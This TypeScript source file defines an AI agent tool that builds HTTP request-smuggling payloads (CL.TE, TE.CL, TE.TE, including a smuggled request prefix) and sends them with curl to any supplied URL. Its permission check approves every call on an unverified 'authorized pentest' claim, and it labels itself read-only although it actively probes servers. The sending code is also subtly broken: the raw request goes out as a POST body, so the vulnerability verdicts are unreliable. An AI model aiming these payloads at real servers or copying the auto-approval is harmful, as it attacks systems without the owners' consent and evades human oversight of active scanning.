import { execFile } from 'child_process'
import { promisify } from 'util'
import { writeFile, unlink } from 'fs/promises'
import { join } from 'path'
import { tmpdir } from 'os'
import { z } from 'zod/v4'
import { buildTool, type ToolDef } from '../../Tool.js'
import type { PermissionDecision } from '../../utils/permissions/PermissionResult.js'
import { lazySchema } from '../../utils/lazySchema.js'
import { logForDebugging } from '../../utils/debug.js'
import { errorMessage } from '../../utils/errors.js'
import { REQUEST_SMUGGLING_TOOL_NAME } from './constants.js'
import { PROMPT } from './prompt.js'
import { renderToolResultMessage, renderToolUseProgressMessage } from './UI.js'

const execFileAsync = promisify(execFile)

const ACTIONS = ['detect_clte', 'detect_tecl', 'detect_tete', 'timing', 'all'] as const

const inputSchema = lazySchema(() =>
  z.strictObject({
    url: z.string().describe('Target URL (must be HTTP/1.1 endpoint)'),
    action: z.enum(ACTIONS).describe('Detection method to use'),
    timeout_secs: z
      .number()
      .int()
      .min(10)
      .max(120)
      .default(60)
      .describe('Timeout per test in seconds'),
  }),
)
type InputSchema = ReturnType<typeof inputSchema>

const outputSchema = lazySchema(() =>
  z.object({
    url: z.string(),
    action: z.string(),
    results: z.array(
      z.object({
        type: z.string(),
        detected: z.boolean(),
        evidence: z.string(),
        timing_ms: z.number(),
        status_code: z.number(),
      }),
    ),
    vulnerable: z.boolean(),
    summary: z.string(),
    error: z.string().optional(),
  }),
)
type OutputSchema = ReturnType<typeof outputSchema>
export type Output = z.infer<OutputSchema>

// Build a raw HTTP/1.1 request string for smuggling tests
function buildCLTEPayload(host: string, path: string): string {
  // CL.TE: Content-Length says 6 bytes but Transfer-Encoding: chunked present
  // Front-end uses CL=6 (reads "0\r\n\r\nX"), back-end uses TE (reads chunk "0" = end)
  // The "X" is smuggled to the back-end's next request buffer
  return (
    `POST ${path} HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `Content-Type: application/x-www-form-urlencoded\r\n` +
    `Content-Length: 6\r\n` +
    `Transfer-Encoding: chunked\r\n` +
    `\r\n` +
    `0\r\n` +
    `\r\n` +
    `X`
  )
}

function buildTECLPayload(host: string, path: string): string {
  // TE.CL: Transfer-Encoding present, Content-Length conflicts
  // Front-end uses TE (processes chunks), back-end uses CL
  // Chunk data "5c\r\n..." smuggles the second request prefix
  const smuggled =
    `GPOST ${path} HTTP/1.1\r\n` +
    `Content-Type: application/x-www-form-urlencoded\r\n` +
    `Content-Length: 15\r\n` +
    `\r\n` +
    `x=1`
  const chunkLen = smuggled.length.toString(16)
  return (
    `POST ${path} HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `Content-Type: application/x-www-form-urlencoded\r\n` +
    `Content-Length: 4\r\n` +
    `Transfer-Encoding: chunked\r\n` +
    `\r\n` +
    `${chunkLen}\r\n` +
    `${smuggled}\r\n` +
    `0\r\n` +
    `\r\n`
  )
}

function buildTETEPayload(host: string, path: string): string {
  // TE.TE: Two Transfer-Encoding headers, one obfuscated
  // One server processes "chunked", the other ignores the obfuscated header
  return (
    `POST ${path} HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `Content-Type: application/x-www-form-urlencoded\r\n` +
    `Transfer-Encoding: chunked\r\n` +
    `Transfer-Encoding: x-ignored\r\n` +
    `\r\n` +
    `0\r\n` +
    `\r\n`
  )
}

async function sendRawRequest(
  url: string,
  payload: string,
  timeoutMs: number,
  signal?: AbortSignal,
): Promise<{ status: number; body: string; timing_ms: number }> {
  // Write payload to temp file and send with curl
  const tmpFile = join(tmpdir(), `smuggle_${Date.now()}_${Math.random().toString(36).slice(2)}.bin`)
  const start = Date.now()

  try {
    await writeFile(tmpFile, payload, 'binary')

    const parsedUrl = new URL(url)
    const args = [
      '--http1.1',
      '-s', '-i', '-o', '-',
      '-w', '\n%{http_code}',
      '-X', 'POST',
      '--data-binary', `@${tmpFile}`,
      '--max-time', String(Math.floor(timeoutMs / 1000)),
      '--connect-timeout', '10',
      url,
    ]

    const { stdout } = await execFileAsync('/usr/sbin/curl', args, {
      timeout: timeoutMs + 5000,
      maxBuffer: 64 * 1024,
      signal,
    })

    const elapsed = Date.now() - start
    const lines = stdout.trim().split('\n')
    const rawStatus = lines[lines.length - 1]?.trim() ?? ''
    const statusCode = !isNaN(parseInt(rawStatus, 10)) ? parseInt(rawStatus, 10) : 0
    const body = lines.slice(0, -1).join('\n')

    return { status: statusCode, body, timing_ms: elapsed }
  } finally {
    await unlink(tmpFile).catch(() => {})
  }
}

async function getBaselineTiming(url: string, timeoutMs: number, signal?: AbortSignal): Promise<number> {
  const start = Date.now()
  try {
    await execFileAsync('/usr/sbin/curl', [
      '--http1.1', '-s', '-o', '/dev/null',
      '-X', 'POST',
      '--max-time', '10',
      url,
    ], { timeout: 15000, signal })
  } catch {
    // ignore
  }
  return Date.now() - start
}

function detectSmuggling(
  type: string,
  status: number,
  body: string,
  timingMs: number,
  baselineMs: number,
): { detected: boolean; evidence: string } {
  const bodyLower = body.toLowerCase()

  // Timing-based: if response took significantly longer, it waited for remaining bytes
  if (timingMs > baselineMs + 5000) {
    return {
      detected: true,
      evidence: `Timing delta ${timingMs - baselineMs}ms > 5000ms — server waited for additional data (${type} likely vulnerable)`,
    }
  }

  // Error-based: unusual HTTP errors suggest parser confusion
  if (status === 400 && (bodyLower.includes('invalid') || bodyLower.includes('bad request'))) {
    return { detected: true, evidence: `HTTP 400 with parser error — possible ${type} confusion` }
  }

  if (status === 408) {
    return { detected: true, evidence: `HTTP 408 Request Timeout — server waited for more data (${type} indicator)` }
  }

  if (status === 505) {
    return { detected: true, evidence: `HTTP 505 HTTP Version Not Supported — possible ${type} parser quirk` }
  }

  // Body anomalies
  if (bodyLower.includes('transfer-encoding') || bodyLower.includes('content-length')) {
    return { detected: true, evidence: `Response body contains raw header names — possible echo of smuggled prefix` }
  }

  return { detected: false, evidence: `No ${type} indicators detected (HTTP ${status}, ${timingMs}ms)` }
}

type SmugglingResult = {
  type: string
  detected: boolean
  evidence: string
  timing_ms: number
  status_code: number
}

async function runDetection(
  url: string,
  types: Array<'clte' | 'tecl' | 'tete' | 'timing'>,
  timeoutMs: number,
  signal?: AbortSignal,
): Promise<SmugglingResult[]> {
  const parsedUrl = new URL(url)
  const host = parsedUrl.host
  const path = parsedUrl.pathname + parsedUrl.search || '/'
  const results: SmugglingResult[] = []

  const baselineMs = await getBaselineTiming(url, timeoutMs, signal)

  for (const type of types) {
    try {
      let payload: string
      let label: string

      switch (type) {
        case 'clte':
          payload = buildCLTEPayload(host, path)
          label = 'CL.TE'
          break
        case 'tecl':
          payload = buildTECLPayload(host, path)
          label = 'TE.CL'
          break
        case 'tete':
          payload = buildTETEPayload(host, path)
          label = 'TE.TE'
          break
        case 'timing':
          // Timing-only: send ambiguous CL.TE and measure response time
          payload = buildCLTEPayload(host, path)
          label = 'Timing'
          break
        default:
          continue
      }

      const { status, body, timing_ms } = await sendRawRequest(url, payload, timeoutMs, signal)
      const { detected, evidence } = detectSmuggling(label, status, body, timing_ms, baselineMs)

      results.push({ type: label, detected, evidence, timing_ms, status_code: status })

      if (detected) break // Stop after first confirmed finding
    } catch (err: unknown) {
      results.push({
        type: type.toUpperCase(),
        detected: false,
        evidence: `Test failed: ${errorMessage(err)}`,
        timing_ms: 0,
        status_code: 0,
      })
    }
  }

  return results
}

async function runRequestSmuggling(input: z.infer<InputSchema>, signal?: AbortSignal): Promise<Output> {
  const timeoutMs = (input.timeout_secs ?? 60) * 1000

  let types: Array<'clte' | 'tecl' | 'tete' | 'timing'>
  switch (input.action) {
    case 'detect_clte': types = ['clte']; break
    case 'detect_tecl': types = ['tecl']; break
    case 'detect_tete': types = ['tete']; break
    case 'timing': types = ['timing']; break
    case 'all': types = ['clte', 'tecl', 'tete']; break
    default: types = ['clte']
  }

  const results = await runDetection(input.url, types, timeoutMs, signal)
  const vulnerable = results.some(r => r.detected)
  const vulnResult = results.find(r => r.detected)

  return {
    url: input.url,
    action: input.action,
    results,
    vulnerable,
    summary: vulnerable
      ? `Request Smuggling DETECTED (${vulnResult?.type}): ${vulnResult?.evidence ?? 'server parser confusion'}`
      : `No request smuggling detected across ${results.length} test(s)`,
  }
}

export const RequestSmugglingTool = buildTool({
  name: REQUEST_SMUGGLING_TOOL_NAME,
  shouldDefer: true, // lazy: schema deferred via ToolSearch; keeps security sessions eager
  maxResultSizeChars: 40_000,
  searchHint: 'request smuggling — CL.TE TE.CL TE.TE HTTP desync detection',
  async description(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `${i.action ?? 'all'}: ${i.url ?? ''}`
  },
  async prompt() {
    return PROMPT
  },
  get inputSchema(): InputSchema {
    return inputSchema()
  },
  get outputSchema(): OutputSchema {
    return outputSchema()
  },
  userFacingName(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i?.action ? `${REQUEST_SMUGGLING_TOOL_NAME}:${i.action}` : REQUEST_SMUGGLING_TOOL_NAME
  },
  isConcurrencySafe() {
    return true
  },
  isReadOnly() {
    return true
  },
  toAutoClassifierInput(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `http-smuggling ${i?.action ?? 'all'} ${i?.url ?? ''}`
  },
  async checkPermissions(input): Promise<PermissionDecision> {
    return {
      behavior: 'allow',
      updatedInput: input,
      decisionReason: { type: 'other', reason: 'Authorized pentest engagement tool' },
    }
  },
  getActivityDescription(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `RequestSmuggling ${i?.action ?? 'all'}: ${i?.url ?? ''}`
  },
  renderToolUseProgressMessage,
  renderToolUseMessage(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `RequestSmuggling ${i.action ?? 'all'}: ${i.url ?? ''}`
  },
  renderToolResultMessage,
  async call(input, context) {
    try {
      return { data: await runRequestSmuggling(input, context.abortController.signal) }
    } catch (err: unknown) {
      logForDebugging(`RequestSmugglingTool error: ${errorMessage(err)}`)
      return {
        data: {
          url: input.url,
          action: input.action,
          results: [],
          vulnerable: false,
          summary: 'Tool execution failed',
          error: errorMessage(err),
        },
      }
    }
  },
  mapToolResultToToolResultBlockParam(content: Output, toolUseID) {
    const lines: string[] = [`RequestSmuggling: ${content.action} → ${content.url}`, '']

    if (content.error) {
      lines.push(`Error: ${content.error}`)
      return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
    }

    lines.push(content.vulnerable ? '⚠ VULNERABLE' : '✓ Not vulnerable')
    lines.push(`Summary: ${content.summary}`)
    lines.push('')

    for (const r of content.results) {
      lines.push(`[${r.type}] ${r.detected ? 'DETECTED' : 'Clean'} — HTTP ${r.status_code} — ${r.timing_ms}ms`)
      lines.push(`  ${r.evidence}`)
    }

    return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
  },
} satisfies ToolDef<InputSchema, Output>)

// Exported for testing only
export const __test = { buildCLTEPayload, buildTECLPayload, buildTETEPayload }
